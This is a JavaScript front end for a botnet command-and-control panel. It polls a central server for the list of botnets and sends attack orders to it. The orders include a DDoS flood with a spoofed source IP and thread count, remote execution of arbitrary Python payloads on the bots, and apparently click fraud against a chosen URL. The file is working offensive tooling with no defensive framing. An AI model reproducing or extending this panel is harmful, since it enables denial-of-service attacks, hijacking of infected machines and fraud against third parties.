let serverURL = null;
let confirmLeaveCommand = false;

/**
 * Save the server URL in the local storage
 * @param {HTMLButtonElement} button Triggered button
 */
function saveServerUrl(button) {
    serverURL = document.getElementById('serverUrl').value;
    button.disabled = true;
    button.innerText = "Saved !"
    setTimeout(() => {
        button.disabled = false;
        button.innerText = "Save"
    }, 1000);
    window.localStorage.setItem('serverURL', serverURL);
    document.getElementById("bt-send").disabled = false;
}

/**
 * Parse the botnets results from central server
 * @param {Array} botnets Array of botnets
 * @returns Array of parsed botnets
 */
function parseBotnets(botnets) {
    for (let i = 0; i < botnets.length; i++) {
        botnets[i] = JSON.parse(botnets[i]);
    }
    return botnets
}

/**
 * Retrieve botnet list from the central server
 */
function getBotnets() {
    if (!serverURL || serverURL === '')
        return;

    const xhr = new XMLHttpRequest();
    xhr.open('GET', `${serverURL}/botnets`);
    xhr.onload = () => {
        const botnets = parseBotnets(JSON.parse(xhr.responseText));
        renderBotnets(botnets)
    }
    xhr.send();
}

/**
 * Render botnet list
 * @param {Array} botnets Array of botnets 
 */
function renderBotnets(botnets) {
    const botnetContainer = document.getElementsByClassName('botnet-activity')[0];
    // Delete children
    botnetContainer.innerHTML = '';

    // Render botnets
    for (const botnet of botnets) {
        botnetContainer.insertAdjacentHTML('beforeend', `
            <div class="botnet ${botnet.running ? 'running' : 'hold'}" title="${botnet.running ? 'Attack running' : 'On hold'}">
                <b>${botnet.uuid}</b>
                <p>${botnet.count} - ${botnet.last_seen}</p>
            </div>
        `)
    }
}

/**
 * Render a form for a given command
 * @param {string} command Command name 
 */
function generateCommandConfigurationForm(command) {
    if (confirmLeaveCommand) {
        if (!confirm("A command is already setup, do you really want to erase it ?")) {
            return;
        }
        confirmLeaveCommand = false;
    }
    const configContainer = document.getElementById('command-configuration');
    const commandDef = getCommandConfig(command)
    configContainer.innerHTML = '';
    for (const key of Object.keys(commandDef)) {
        configContainer.insertAdjacentHTML('beforeend', `
            <div style="margin-bottom: 10px;">
                <p style="display: inline;">${commandDef[key].label}</p>
                ${getInput(commandDef[key].type, key, commandDef[key].value)}
            </div>
        `);
        if (commandDef[key].type === 'code') {
            setCodeEditorEvents();
        }
    }
    configContainer.insertAdjacentHTML('beforeend', `
        <label for="cb-force-command">Force command</label>
        <input type="checkbox" name="force" id="cb-force-command" class='command-value'/>
    `);
}

/**
 * Generates an HTML Element depending on the required input type
 * @param {string} type Type of the HTML element
 * @param {string} key Command attribute key
 * @param {string} value Command attribute value
 * @returns HTML Element as string
 */
function getInput(type, key, value) {
    switch (type) {
        case 'text':
            return `<input type="text" name=${key} placeholder="${key}" value="${value}" class='command-value' />`
        case 'number':
            return `<input type="number" name=${key} placeholder="${key}" value="${value}" class='command-value' />`
        case 'textarea':
            return `<textarea name=${key} placeholder="${key}" class='command-value'>${value}</textarea>`
        case 'code':
            return `<div id="editor" style="min-height: 500px;" class='command-value' name="${key}"></div>`
    }
}

/**
 * Setup the code editor 
 */
function setCodeEditorEvents() {
    const editor = ace.edit("editor");
    editor.setTheme("ace/theme/monokai");
    editor.session.setMode("ace/mode/python");
    editor.setValue("# Your python code here");
    editor.on('change', function (e) {
        // If a code is in the editor, require a confirmation before changing command
        confirmLeaveCommand = editor.getValue().length > 0;
    });
}

/**
 * Return a command definition
 * @param {string} name Command name
 * @returns Command definition
 */
function getCommandConfig(name) {
    const command = { type: { type: 'text', value: name, label: "Type" } };
    switch (name) {
        case 'ddos':
            Object.assign(command, {
                target_ip: { type: "text", value: "", label: "Target IP" },
                target_port: { type: "number", value: "80", label: "Target Port" },
                fake_ip: { type: "text", value: "", label: "Fake IP" },
                nb_threads: { type: "number", value: "20", label: "Number of threads" }
            });
            break;

        case 'rce':
            Object.assign(command, {
                payload: { type: "code", value: "// Your code here", label: "Code payload" }
            });
            break;

        case 'click':
            Object.assign(command, {
                url: { type: "text", value: "http://", label: "URL" }
            });
            break;
    }
    return command;
}

/**
 * Send the command to the central server
 */
function sendCommand() {
    if (confirm('Confirm attack ?')) {
        const form = document.getElementById('command-configuration');
        const payload = {};
        const inputs = form.getElementsByClassName('command-value');
        for (const input of inputs) {
            if (input.id === "editor") {
                const editor = ace.edit("editor");
                Object.assign(payload, { [input.getAttribute("name")]: editor.getValue() });
            } else {
                Object.assign(payload, { [input.getAttribute("name")]: input.getAttribute('type') === 'checkbox' ? input.checked : input.value });
            }
        }

        const xhr = new XMLHttpRequest();
        xhr.open('POST', `${serverURL}/command`);
        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        xhr.send(JSON.stringify(payload));

        xhr.onload = () => {
            if (xhr.status === 200)
                alert('Command successfully sent !');
            else
                alert(xhr.responseText)
        }

        xhr.onerror = () => {
            alert(xhr.responseText)
        }
    }
}

/**
 * Send the stop command to the central server
 */
function stopCommand() {
    if (confirm('Stop attack ?')) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', `${serverURL}/command/stop`);
        xhr.send();

        xhr.onload = () => {
            if (xhr.status === 200)
                alert('STOP command successfully sent!');
            else
                alert(xhr.responseText)
        }

        xhr.onerror = () => {
            alert(xhr.responseText)
        }
    }
}

/**
 * Start the bot refreshed list after window loaded
 */
window.addEventListener('load', function () {
    serverURL = this.window.localStorage.getItem('serverURL');
    this.setInterval(getBotnets, 1000);
})